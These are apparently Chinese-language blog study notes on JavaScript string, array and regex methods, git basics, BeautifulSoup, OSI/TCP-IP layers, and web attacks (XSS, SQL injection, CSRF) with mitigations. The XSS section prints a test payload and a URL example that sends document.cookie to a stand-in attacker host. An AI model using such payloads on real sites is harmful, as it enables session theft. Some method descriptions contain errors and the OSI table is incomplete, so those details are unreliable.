字符串方法(不会修改原字符串)

  1. str.length只可读
  2. str[i]不兼容IE6-7(str.charAt(i))

  5. str.charAt(index)返回执行序号的字符串
  6. str.charCodeAt(index)返回执行序号下字符的ASCII码
  7. String.fromCharCode(80)返回ASCII为80的字符
  8. str.substring( 起始序号-包含 , 结束序号-不包含 )返回截取的字符串
  9. str.slice( 起始序号-包含 , 结束序号-不包含 )返回截取的字符串,负数代表倒数的index
  10. str.substr( 起始序号-包含 , 截取长度 )返回截取的字符串
  11. str.trim去除首尾空格
  12. str.toUpperCase() / str.toLowerCase()
    以下方法可以使用正则
  13. str.match('c')返回c或null
  14. str.search('c')返回str中第一个c的下标或-1
  15. str.replace('c','d')只替换第一个(如果使用正则的全局匹配就可替换所有),返回替换后的str,
  16. str.split('c')返回用c将str分割成的数组

数组

数组的方法
  1. 数组.length 可读可写
  2. 数组[序号] 可读可写
  3. arr.unshift( 新数据1 , 新数据2 )
    功能: 在原数组开头添加新数据
    返回: 新数组的长度
    是否改变原数组: 是
  4. arr.push( 新数据1 , 新数据2 )
    功能: 在原数组最后添加新数据
    返回: 新数组的长度
    是否改变原数组: 是
  5. arr.shift()
    功能: 移除数组第一个成员
    返回: 移除的成员
    是否改变原数组: 是
  6. arr.pop()
    功能: 移除数组最后一个成员
    返回: 移除的成员
    是否改变原数组: 是
  7. arr.splice( a , b , c1 , c2 ... )
    a: 开始的序号
    b: 删除的个数
    c: 填充的成员
    返回: 只返回删除的对象
    是否改变原数组: 是
    只填一个参数时: 表示从下标为0处开始删除x个
  8. arr.slice( a , b )
    1. 与字符串splice相同
    2. 返回: 切割的数组
    3. 是否改变原数组: 不会
  9. arr.sort(function(x,y){return x-y})
    功能: 对数字数组排序
    return x-y : 原数组升序
return 小于0的数 : 原数组不变
return y-x : 原数组倒序
return 大于0的数 : 原数组反转
    返回: 新数组
    是否改变原数组: 是
  10. arr.reverse()
    功能: 反转数组
    返回: 新数组
    是否改变原数组: 是
  11. 数组1.concat( 数组2 , 数组3 )
    功能: 拼接数组
    返回: 新数组
    是否改变原数组: 否
  12. arr.join( 字符串 )
    功能: 将数组成员用参数字符串拼接成字符串
    返回: 字符串
    是否改变原数组: 否
  13. Array.isArray( 参数 )
    功能: 判断参数是否为数组
    返回: 布尔值

  14. arr.forEach(function(value,index,arr){})
    功能: 遍历数组
    是否改变原数组: 是

  15. arr.filter(function(value,index,arr){})
    return 条件
    功能: 筛选数组
    返回: 新数组
    内部函数返回布尔值
    是否改变原数组: 否

  16. arr.map(function(value,index,arr){})
    return 条件
    功能: 判断成员是否满足条件
    返回: 布尔值组成的新数组
    return 运算 : 返回运算后的新数组
    功能: 成员进行计算
    返回: 运算后的新数组
    是否改变原数组: 否
    return 值: 将数组每一项替换成这个值并返回

  17. arr.every(function(value,index,arr){})
    return 条件
    功能: 判断成员是否满足条件
    返回: 所有成员满足条件则返回true,否则返回false
    是否改变原数组: 否
  18. arr.some(function(value,index,arr){})
    return 条件
    功能: 判断成员是否满足条件
    返回: 只要有一个成员满足条件则返回true,否则返回false
    是否改变原数组: 否

分布式和集中式

  1. 集中式
    1. 代码集中在一个中央服务器上,所有代码提交到一个服务器中进行管理,代表(SVN)

    1. 每个人可在本地创建代码仓库,可以与远程代码仓库同步代码,也可以互相同步代码

      2. 可以脱离git管理代码
      3. 提交在本地完成,提交旧版本会创建分支
      4. git提交不会被打断,不能自动同步的冲突提示手动完成

        代码管理

        本地管理

        工作区->暂存区->分支

BeautifulSoup常用api

发表于 2018-06-16 | 分类于 python

解析器

Beautiful Soup支持python标准库中的HTML解析器,还支持一些第三方的解析器,常见的解析器有
|解析器|使用方法|
|:-:|:-:|
|python标准库|BeautifulSoup(markup,’html.parser’)|
|lxml HTML解析器|BeautifulSoup(markup,’lxml’)|
|lxml XML解析器|BeautifulSoup(markup,’lxml’, ‘xml’)|
|html5lib|BeautifulSoup(markup,’html5lib’)|

基本使用

  1. soup.p获取第一个p标签
  2. soup.p.attrs['class']或soup.p['class']获取第一个p标签的name属性的值
  3. soup.p.string或soup.p.text获取标签的文本属性
  4. soup.p.children获取第一个p标签的子元素(数组形式)
  5. soup.a.parent获取第一个a标签的父元素
  6. soup.a.next_siblings获取后面的所有兄弟元素,soup.a.next_sibling获取下一个兄弟元素,soup.a.previous_siblings相同
  7. soup.title获取title的内容,soup.title.name获取标签名称

    标准选择器find

  8. find_all返回列表(数组)
    1. soup.find_all('ul')获取所有ul标签以及每个ul标签的内部标签
    2. soup.find_all(attrs={'name': 'xxx'})获取所有属性name为xxx的标签
    3. soup.find_all(text='xxx')获取文本为xxx的标签
  9. find(name, attrs, recursive, text, **kwargs)返回第一个元素

CSS选择器

  1. soup.select('ul')返回所有ul标签
  2. soup.select('li')[0].get_text()获取文本内容
  3. soup.select('ul')[0].attrs['id']获取第一个ul的id属性值

JavaScript中正则的使用

JavaScript正则的使用

  1. 可以用正则的方法
    1. reg.exec(str);返回查找的字符串或null,但是只能匹配一次不能全局匹配;返回一个数组,包含匹配到的字符串和分组规则匹配的值
    2. reg.test(str);返回true或false
    3. str.match(reg);返回查找的字符串数组或null,匹配一个;加g时才返回标准数组;不加g时返回类数组包含结果和子集
    4. str.replace(reg , str1);str1可以用函数代替function(a,b,c,d){}a: 匹配内容 b: 匹配的子集 c:匹配内容出现的序号 d: 整体str
    5. str.search(reg);返回查找匹配字符串首次出现的下标或-1
    6. str.split(reg);
  2. 创建正则表达式
    1. 直接量
      var reg = /a/igm;
    2. 构造函数
      var reg = new RegExp(/\w/,'igm');
      var reg = new RegExp('\\w','igm');需要转义
  3. 修饰符
    1. i 忽略大小写
    2. g 全局匹配(查找所有匹配,而非在找到第一个后停止),加了g后返回标准数组
    3. m 执行多行匹配
  4. 特殊字符
    1. |表示或
      1. var reg = new RegExp(/abc|def/,'igm');
    2. 字符集[]匹配括号中任意一个字符
      1. var reg = new RegExp(/[java]/,'igm');
      2. 从str中依次遍历j,a,v,a(匹配j或a或v或a)
      3. []中任何符号都会被认作匹配字符
      4. [a-zA-Z0-9]匹配一个数字或字母
      5. [^0-9]匹配一个非0-9的word
      6. [\u4e00-\u9fa5]匹配一个中文
    3. ^与$
      1. /^java\w*2017$/;//匹配以java开头,2017结尾的字符
      2. /^a/;//以a开头
      3. /a$/;//以a结尾
      4. 注^在[]才表示非
    4. 元字符(转义字符)
      1. \ 转义符(将一个具有特殊意义的字符变得没有意义)
        1. \n字符串换行符 \t制表符 \r回车符
      2. \w 匹配一个[0-9A-Za-z_];word
      3. \W 匹配一个[^0-9A-Za-z_]
      4. \d 匹配一个[0-9];digital
      5. \D 匹配一个[^0-9]
      6. \s 匹配一个空格
      7. \S 匹配一个非空格
      8. \b 匹配一个 单词边界(除了\w之外的都可充当单词边界)
      9. \B匹配不在单词边界上的字符
      10. .匹配所有字符(除了字符串换行符\n,注意不是.)

  5. 量词(针对前面一个符号(或子集))

    1. n? 匹配0个或1个n
    2. n* 匹配0个,1个或多个n
    3. n+ 匹配1个或多个n
    4. n{x} 匹配x个n
    5. n{x,y} 匹配x~y个n
    6. n{x,} 匹配至少x个n

  6. 贪婪和惰性(针对量词)
    量词默认贪婪(尽可能多的匹配)
    如要添加惰性,则?后面不能添加东西

尽可能多的匹配 尽可能少的匹配
+(匹配一个或多个) +?(选择匹配1个)
*(匹配0个一个或多个) *?(选择匹配0个
{1,20} {1,20}?(选择匹配1个)

  1. 分组

    1. 捕获型分组
      1. \1
        1. (n)m\1 \1引用第一个分组( (n) )匹配的结果,第x个左括号就是第x个匹配规则
      2. RegExp.$1
        1. 获取第一个分组匹配的结果
    2. 非捕获型分组(一种断言)
      1. 正向前瞻
        1. var reg = /javascript(?=2007)/;匹配后面是2007的javascript(只拿到javascript);(?:2007)
      2. 负向前瞻
        1. var reg = /javascript(?!2007)/;匹配后面不是2007的javascript
      3. 正向后顾
        1. ?<=2007
      4. 负向后顾
        1. ?<!2007

OSI七层模型结构, TCP/IP四层模型学习笔记

发表于 2018-06-12 | 分类于 网络

OSI七层和TCP/IP四层的关系

  1. TCP/IP先有协议再提出的模型,是参照OSI模型
  2. OSI是理论下的模型,而TCP/IP已被广泛使用
  3. TCP transmission control protocol 传输控制协议
  4. UDP user data protocol 用户数据报协议

OSI七层模型

OSI 功能 协议
应用层 面向计算机用户,提供应用程序和网络之间的接口 HTTP, HTTPS, FTP, TELNET, SSH, SMTP, POP3等
表示层 处理来自应用层的的命令和数据,结果传给会话层 N/A
会话层 不同机器上的用户之间建立会话 N/A
传输层 为会话层和传输层提供传输服务 TCP, UDP
网络层 IP等
数据链路层 数据链路层的数据传输单元成为帧, 就是将网络层转发的数据封装为帧, 传输给物理层, 以及分析物理层传输过来的数据帧 SLIP, CSLIP, PPP, ARP, RARP, MTU等
数据层 ISO2110等

TCP模型

OSI TCP/IP 协议
应用层/表示层/会话层 应用层 HTTP, FTP, TFTP, SMIP, SNMP, DNS
传输层 传输层 TCP, UDP
网络层 网络层 ICMP, IGMP, IP, ARP, RARP
数据链路层/物理层 网络接口层 由底层网络定义协议

交互实例

发送端每通过一层则增加首部,接收端每通过一层则删除首部
|交互|发送端|接收端|
|:-:|:-|:-|
|应用层|HTTP数据|HTTP数据 |
|传输层| TCP首部(HTTP数据) | TCP首部(HTTP数据) |
|网络层|IP首部(TCP首部(HTTP数据) | IP首部(TCP首部(HTTP数据) |
|链路层| 以太网首部(IP首部(TCP首部(HTTP数据))) | 以太网首部(IP首部(TCP首部(HTTP数据))) |

XSS

发生场景

  1. 在input标签中输入 "/><script>alert(document.cookie)</script><!-,因此输入的字符被浏览器解析成js代码执行
  2. 恶意URLhttp://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>

    解决

  3. 将用户输入的字符进行HTML Encode转码
  4. input输入框只允许输入规定的字符

    测试XSS漏洞

  5. 在input标签中输入 "/><script>alert(document.cookie)</script><!-

SQL注入

  1. 用户输入的字符被解析成SQL脚本运行

CSRF攻击

发生场景

  1. 受害者访问URL地址,在COOKIE和SEESION失效之前,继续访问这个网站的另一个危险URL地址,服务器则会把受害者的操作当做正常操作,因为COOKIE和SESSION未失效

测试CSRF漏洞

  1. 抓取一个正常的包,去掉Refererz字段后重新提交,如果有效则可能有CSRF漏洞
  2. 检测工具CSRFTester

解决

  1. 请求必须校验referer字段
  2. 在http请求中以参数的形式产生随机token,并在服务器校验这个token
  3. 在http请求头中添加token值
